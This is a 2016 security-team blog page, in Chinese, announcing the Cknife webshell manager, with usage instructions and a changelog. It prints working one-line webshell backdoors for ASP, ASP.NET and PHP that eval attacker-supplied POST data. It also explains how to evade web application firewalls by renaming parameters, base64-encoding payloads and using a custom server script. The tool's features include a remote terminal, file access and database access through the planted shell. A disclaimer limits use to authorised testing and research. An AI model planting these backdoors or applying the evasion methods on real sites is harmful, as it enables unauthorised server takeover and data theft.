<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Cknife正式版发布[使用说明及更新日志0729] | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Cknife正式版发布[使用说明及更新日志0729]</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Cknife正式版发布[使用说明及更新日志0729]</h1><div class="post-meta">May 14, 2016<span> | </span><span class="category"><a href="/categories/安全工具/">安全工具</a></span></div><div class="post-content"><p>软件名称：Cknife<br>中文名称：C刀<br><span style="color: #ff0000;">源码地址：<a href="https://github.com/Chora10/Cknife" target="_blank" rel="external">https://github.com/Chora10/Cknife</a></span><br><span style="color: #ff0000;"> 下载地址：<a href="http://pan.baidu.com/s/1nul1mpr" target="_blank" rel="external">http://pan.baidu.com/s/1nul1mpr</a> 密码：f65g</span><br><span style="color: #000000;">官方博客：<a href="http://www.ms509.com/" target="_blank" rel="external">http://www.ms509.com/</a></span></p>
<h2 id="作者：-Chora-amp-amp-MelodyZX"><a href="#作者：-Chora-amp-amp-MelodyZX" class="headerlink" title="作者： Chora &amp;&amp; MelodyZX"></a>作者： Chora &amp;&amp; MelodyZX</h2><p><span style="color: #ff0000;">免责声明：</span></p>
<h2 id="本工具仅限于安全研究与教学使用，用户使用本工具所造成的所有后果，由用户承担全部法律及连带责任！作者不承担任何法律及连带责任。"><a href="#本工具仅限于安全研究与教学使用，用户使用本工具所造成的所有后果，由用户承担全部法律及连带责任！作者不承担任何法律及连带责任。" class="headerlink" title="本工具仅限于安全研究与教学使用，用户使用本工具所造成的所有后果，由用户承担全部法律及连带责任！作者不承担任何法律及连带责任。"></a><span style="color: #ff0000;">本工具仅限于安全研究与教学使用，用户使用本工具所造成的所有后果，由用户承担全部法律及连带责任！作者不承担任何法律及连带责任。</span></h2><p>为什么开发Cknife：<br>1、方便已被授权的渗透测试人员进行渗透测试；<br>2、方便WAF厂商提升自身WAF的防护能力；</p>
<h2 id="3、方便管理员管理自身网站及服务器；"><a href="#3、方便管理员管理自身网站及服务器；" class="headerlink" title="3、方便管理员管理自身网站及服务器；"></a>3、方便管理员管理自身网站及服务器；</h2><p>为什么开源Cknife：<br>1、结合大众的力量优化完善本软件；</p>
<h2 id="2、菜刀后门层出不穷，开源来接受大众的监督以及审计。"><a href="#2、菜刀后门层出不穷，开源来接受大众的监督以及审计。" class="headerlink" title="2、菜刀后门层出不穷，开源来接受大众的监督以及审计。"></a>2、菜刀后门层出不穷，开源来接受大众的监督以及审计。</h2><h2 id="理想：希望能在安全研究员以及WAF厂商的对抗中提升国内WAF的防护水平以及安全研究员的实力。"><a href="#理想：希望能在安全研究员以及WAF厂商的对抗中提升国内WAF的防护水平以及安全研究员的实力。" class="headerlink" title="理想：希望能在安全研究员以及WAF厂商的对抗中提升国内WAF的防护水平以及安全研究员的实力。"></a>理想：希望能在安全研究员以及WAF厂商的对抗中提升国内WAF的防护水平以及安全研究员的实力。</h2><a id="more"></a>
<p>一、运行环境：</p>
<p>安装了<span style="color: #ff0000;">JRE1.7+</span>环境的所有操作系统</p>
<h2 id="二、文件说明："><a href="#二、文件说明：" class="headerlink" title="二、文件说明："></a>二、文件说明：</h2><h2 id="Cknife-jar-Cknife主程序"><a href="#Cknife-jar-Cknife主程序" class="headerlink" title="Cknife.jar Cknife主程序"></a>Cknife.jar Cknife主程序</h2><p>Cknife.db Cknife的数据库(不存在会自动生成)<br>Config.ini Cknife的配置文件(不存在会自动生成)<br>ReadMe.txt 你现在正在看的(可删除)<br>1.jsp JSP服务端脚本(可删除)</p>
<h2 id="1-jspx-JSPX服务端脚本-可删除"><a href="#1-jspx-JSPX服务端脚本-可删除" class="headerlink" title="1.jspx JSPX服务端脚本(可删除)"></a>1.jspx JSPX服务端脚本(可删除)</h2><p>三、<span style="color: #ff0000;">使用说明：</span></p>
<p>服务端脚本支持ASP、ASPX、PHP、JSP、JSPX、Customize(自定义)。<br>代码包含且不限于如下代码（只要能构造出类似eval的函数就行，比如PHP的create_function、assert等）</p>
<p>ASP:<br>&lt;%eval request(“Cknife”)%&gt;</p>
<p>ASP.NET:<br>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt;</p>
<p>PHP:<br><!--?php @eval($_POST['Cknife']);?--></p>
<p>JSP:<br>[代码详见1.jsp]</p>
<p>JSPX:<br>[代码详见1.jspx]</p>
<p>Customize:<br>自定义类型,功能代码在服务端保存,理论上支持所有动态脚本,只要正确与C刀进行交互即可。此模式可按需定制，比如只要浏览目录，或是只要虚拟终端功能，代码可以很简短。</p>
<p>四、<span style="color: #ff0000;">数据库功能：</span></p>
<p>首次使用在列表里点击右键，选择数据库管理会提示请先配置数据库，点击配置数据库按钮选择对应的连接方式连接即可。</p>
<p>五、<span style="color: #ff0000;">设置功能：</span></p>
<p><span style="color: #ff0000;">代理功能：</span>在类型处选择代理类型。支持SOCKS、HTTP类型的代理，使用Burp抓取Cknife数据，需选择代理类型为HTTP，并填上对应的IP以及端口即可。<br>如果想要<span style="color: #ff0000;">关闭代理功能</span>，只需要选择代理类型为DIRECT，或者清空用户名或密码，即表示关闭代理。</p>
<p><span style="color: #ff0000;">自定义请求头功能：</span>在文本框里输入要自定义的请求头以及对应的值，可以添加或修改多个请求头。只需要按照如下格式添加即可：<br>User-Agent:xxx<br>Cookie:xxx<br>ms509:Chora<br>如果想要<span style="color: #ff0000;">关闭自定义请求头功能</span>，只需要把文本框内容清空，或者选中关闭选项并确定。</p>
<p>六、<span style="color: #ff0000;">过WAF</span></p>
<p>这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义，主程序只是图形的展示，以及数据的发送。<br>我分开了每一个步骤写入到配置文件里面，用户可以自定义任何代码，包括更改参数名称，参数内容。<br>比如：<br>SKIN=javax.swing.plaf.nimbus.NimbusLookAndFeel 设置皮肤为nimbus<br>SPL=-&gt;| 表示截取数据的开始符号<br>SPR=| CODE=code 编码参数<br>ACTION=action 动作参数<br>PARAM1=z1 参数1<br>PARAM2=z2 参数2<br>PHP_BASE64=1 当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0<br>PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式<br>PHP_INDEX=… 显示主页功能的代码放这儿<br>PHP_READDICT=… 读取主页功能的代码放这儿<br>PHP_READFILE=… 读取文件功能的代码放这儿<br>PHP_DELETE=… 删除文件夹以及文件功能的代码放这儿<br>PHP_RENAME=… 重命名文件夹以及文件功能的代码放这儿<br>PHP_RETIME=… 修改时间功能的代码放这儿<br>PHP_NEWDICT=… 新建目录功能的代码放这儿<br>PHP_UPLOAD=… 上传文件功能的代码放这儿<br>PHP_DOWNLOAD=… 下载文件功能的代码放这儿<br>PHP_SHELL=… 虚拟终端功能的代码放这儿<br>PHP_DB<em>MYSQL=… 管理MYSQL数据库功能的代码放这儿<br>ASP</em>…=…<br>ASPX<em>…=…<br>JSP</em>…=…</p>
<p>除了修改以上参数过WAF外，程序还额外提供了一种Customize过WAF的模式。<br>Customize模式原本是用于支持一些程序默认不支持的脚本，比如CFM、ASMX、ASHX、PY等等，只要用户自写的脚本能正确与菜刀进行交互即可。</p>
<p>换一个思考方式，如果我们自写一个PHP脚本实现了列文件以及目录的功能，它能够正确的与C刀进行交互，这个时候如果我们选择PHP(Eval)的连接方式就会连接失败。<br>应该选择Customize模式进行连接。有人说为什么一句话就可以连接，你偏偏还要写这么多代码用Customize模式连接？如果一个很厉害的WAF检测eval,assert等关键词<br>，你的一句话实在是饶不过，这个时候你可以不用一句话，就在PHP脚本里用正常代码实现列文件以及目录，然后用Customize模式连接就达到了过WAF的目的。</p>
<p>Customize(自定义)模式跟其他模式一样，每一个步骤也都写入到配置文件里面，用户同样可以参数名称以及参数内容。<br>比如你自写了用Customize模式连接的Customize.php服务端。显示主页功能提交的参数应该是：密码=1&amp;action=index以及密码=1&amp;action=readdict。<br>如果C刀普及以后WAF厂商肯定会把readdict列入黑名单，这个时候你就可以修改readdict的名称为其他名称，同样可以修改action的名称，也可以修改1为其他字符<br>CUS_MAKE=1<br>CUS_INDEX=index<br>CUS_READDICT=readdict<br>CUS_READFILE=readfile<br>CUS_SAVEFILE=savefile<br>CUS_DELETE=delete<br>CUS_RENAME=rename<br>CUS_RETIME=retime<br>CUS_NEWDICT=newdict<br>CUS_UPLOAD=upload<br>CUS_DOWNLOAD=download<br>CUS_SHELL=shell</p>
<p>七、<span style="color: #ff0000;">更新日志：</span></p>
<p>程序在使用过程中难免有各种BUG，及时关注看一下是否有更新吧，说不定己经修补了呢。</p>
<p>已知问题：<br>Graphite与Metal类型的皮肤互相之间切换不需要重启Cknife，其余类型(Nimbus、Windows、Mac等)的皮肤相互之间切换也不需要重启Cknife，<br>但是这两种类型的皮肤进行切换就需要重启Cknife才能完全生效，不然最小化、最大化、关闭按钮不会显示，这是Swing架构遗留的问题。</p>
<p>20160729<br>1、文件管理修复若干BUG<br>2、文件管理新增<span style="color: #ff0000;">修改时间</span>功能<br>3、文件管理优化界面</p>
<p>20160728<br>1、数据库管理修复若干BUG<br>2、数据库管理增加<span style="color: #ff0000;">获取表行数</span><br>3、数据库管理优化界面</p>
<p>20160623<br>1、虚拟终端增加<span style="color: #ff0000;">右键复制粘贴</span>功能（快捷键Ctrl+C、Ctrl+V）<br>2、虚拟终端增加上键下键<span style="color: #ff0000;">切换历史命令</span>功能<br>3、数据库管理增加<span style="color: #ff0000;">右键导出数据</span>功能</p>
<p>20160622<br>1、修复ORACLE数据库连接失败的问题<br>2、修复在某分辨率下添加SHELL对话框里的密码文本框消失的问题<br>3、更新JSPX脚本</p>
<p>20160620<br>1、修复命令执行低概率执行失败的情况<br>2、数据库管理界面优化</p>
<p>20160618<br>1、<span style="color: #ff0000;">添加对HTTPS协议的支持</span><br>2、修复文件管理右边栏遇到乱码不显示的情况</p>
<p>20160513<br>1、添加自定义请求头功能</p>
<p>20160511<br>1、添加设置选项并增加了代理功能<br>2、<span style="color: #ff0000;"><span style="color: #000000;">增加了对JSPX脚本的支持，</span>连接时脚本类型选择JSP(Eval)</span></p>
<p>20160426<br>1、修复JSP连接MYSQL数据库异常的问题<br>2、虚拟终端增加自定义Cmd路径的功能，<span style="color: #ff0000;">命令为setp [path]</span></p>
<p>20160413<br>1、添加自定义模式shell返回路径的自定义分隔符<br>2、添加JSP对MSSQL的支持</p>
<p>20160318<br>1、优化界面，右边栏点击目录后左边栏也会选中<br>2、修复ASP、ASPX、JSP在打开空目录时会失败的问题<br>3、将默认皮肤Graphite添加到皮肤切换功能<br>4、虚拟终端增加标识符方便用户分辨<br>5、数据库部分功能增加多线程</p>
<p>20160317<br>1、优化文件管理左边栏的打开方式<br>2、文件管理所有功能使用多线程，防止高延迟请求界面会卡的情况发生</p>
<p>20160316<br>1、修复在Linux下默认皮肤显示乱码的问题<br>2、添加ASPX对MSSQL、ACCESS的支持<br>3、更换皮肤解决选中后看不清的情况</p>
<p>20160314<br>1、添加ASP对MSSQL、ACCESS的支持<br>2、修复中文路径启动失败的问题</p>
<p>20160311<br>1、修复模拟终端若干BUG；<br>2、模拟终端使用多线程，防止高延迟请求界面会卡的情况发生</p>
<p>20160310<br>1、添加JSP对MYSQL、ORACLE的支持<br>2、修复在Windows下，文件管理会多出一个盘符</p>
<p>20160307<br>1、连接失败返回详细信息，方便用户分析问题</p>
<p>20160301<br>1、合并Cknife与Cknife_Skin<br>2、添加数据库功能，添加PHP对MYSQL、ORACLE的支持</p>
</div><div class="tags"></div><div class="post-nav"><a href="/2016/05/27/e5-b0-8f-e8-8d-b7-e6-89-8d-e9-9c-b2-e5-b0-96-e5-b0-96-e8-a7-92cncert-2016-e4-b8-ad-e5-9b-bd-e7-bd-91-e7-bb-9c-e5-ae-89-e5-85-a8-e5-b9-b4-e4-bc-9a-e6-bc-94-e8-ae-b2ppt/" class="pre">2016中国网络安全年会专题演讲</a><a href="/2016/04/18/spywaller/" class="next">Spywaller恶意代码分析</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/IOS/">IOS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/未分类/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/二进制安全/">二进制安全</a></li></ul></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/android-drozer/" style="font-size: 15px;">android drozer</a> <a href="/tags/Cknife-Disclaimer/" style="font-size: 15px;">Cknife Disclaimer</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-infoleak/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/684/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/27/e8-93-9d-e7-89-99app-e6-bc-8f-e6-b4-9e-e7-b3-bb-e5-88-97-e5-88-86-e6-9e-90-e4-b9-8b-e4-ba-8ccve-2017-0639/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/23/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/e5-90-8c-e5-bd-a2-e5-bc-82-e4-b9-89-e5-ad-97-e9-92-93-e9-b1-bc-e6-94-bb-e5-87-bb-ef-bc-8c-e9-92-89-e9-92-89-e4-b8-ad-e6-8b-9b/">“同形异义字”钓鱼攻击，钉钉中招</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/Bluetooth-Vul-2/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/06/e5-88-86-e4-ba-ab-e4-b8-80-e7-a7-8d-e5-8f-af-e5-85-b3-e9-97-ad-e5-a4-a7-e5-a4-9a-e6-95-b0-e6-9d-80-e8-bd-af-e7-9a-84-e6-8a-80-e6-9c-af-ef-bc-88-e5-af-b9360-e5-ae-89-e5-85-a8-e5-8d-ab-e5-a3-ab/">分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/e8-93-9d-e7-89-99app-e6-bc-8f-e6-b4-9e-e7-b3-bb-e5-88-97-e5-88-86-e6-9e-90-e4-b9-8b-e4-b8-80/">蓝牙App漏洞系列分析之一</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/14/e9-a6-96-e5-8f-91-wannacry-e5-8b-92-e7-b4-a2-e8-bd-af-e4-bb-b6-e6-af-8d-e4-bd-93-e4-b8-bb-e7-a8-8b-e5-ba-8f-e9-80-86-e5-90-91-e5-88-86-e6-9e-90-ef-bc-88-e5-90-ab-e4-b8-b4-e6-97-b6-e8-a7-a3-e5-86-b3/">首发 | Wannacry勒索软件母体主程序逆向分析（含临时解决方案自动化工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/04/Bluetoooth_Vul_1/">蓝牙App漏洞系列分析之一</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>